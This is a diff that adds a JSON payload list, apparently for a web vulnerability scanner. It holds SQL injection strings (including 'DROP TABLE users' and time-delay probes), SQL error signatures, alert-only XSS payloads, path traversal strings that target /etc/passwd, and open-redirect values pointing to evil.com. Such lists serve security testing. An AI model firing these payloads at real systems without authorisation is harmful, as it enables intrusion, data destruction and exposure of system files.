@@ -1,0 +1,71 @@
+{
+  "sqli": {
+    "error_based": [
+      "' OR '1'='1",
+      "' OR '1'='1'--",
+      "' OR 1=1--",
+      "' OR 1=1#",
+      "'; DROP TABLE users--",
+      "1' ORDER BY 1--",
+      "1' ORDER BY 2--",
+      "1' ORDER BY 3--",
+      "' UNION SELECT NULL--",
+      "' UNION SELECT NULL,NULL--",
+      "admin'--",
+      "1 OR 1=1",
+      "' OR 'x'='x",
+      "') OR ('1'='1",
+      "1; SELECT SLEEP(5)--"
+    ],
+    "blind_time": [
+      "'; WAITFOR DELAY '0:0:5'--",
+      "1; SELECT SLEEP(5)--",
+      "'; SELECT pg_sleep(5)--"
+    ],
+    "error_signatures": [
+      "you have an error in your sql syntax",
+      "warning: mysql",
+      "unclosed quotation mark",
+      "quoted string not properly terminated",
+      "odbc sql server driver",
+      "ora-01756",
+      "postgresql error",
+      "sqlite3.operationalerror",
+      "supplied argument is not a valid mysql",
+      "mysql_fetch_array()",
+      "sql syntax",
+      "syntax error",
+      "mysql error"
+    ]
+  },
+  "xss": {
+    "reflected": [
+      "<script>alert('XSS')</script>",
+      "<img src=x onerror=alert('XSS')>",
+      "<svg onload=alert('XSS')>",
+      "'\"><script>alert('XSS')</script>",
+      "<body onload=alert('XSS')>",
+      "<iframe src=javascript:alert('XSS')>",
+      "<input autofocus onfocus=alert('XSS')>",
+      "javascript:alert('XSS')",
+      "<details open ontoggle=alert('XSS')>",
+      "<marquee onstart=alert('XSS')>"
+    ],
+    "dom": [
+      "#<script>alert('XSS')</script>",
+      "#<img src=x onerror=alert(1)>"
+    ]
+  },
+  "path_traversal": [
+    "../../etc/passwd",
+    "../../../etc/passwd",
+    "..%2F..%2Fetc%2Fpasswd",
+    "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+  ],
+  "open_redirect": [
+    "//evil.com",
+    "https://evil.com",
+    "//evil.com/%2F..",
+    "///evil.com"
+  ]
+}
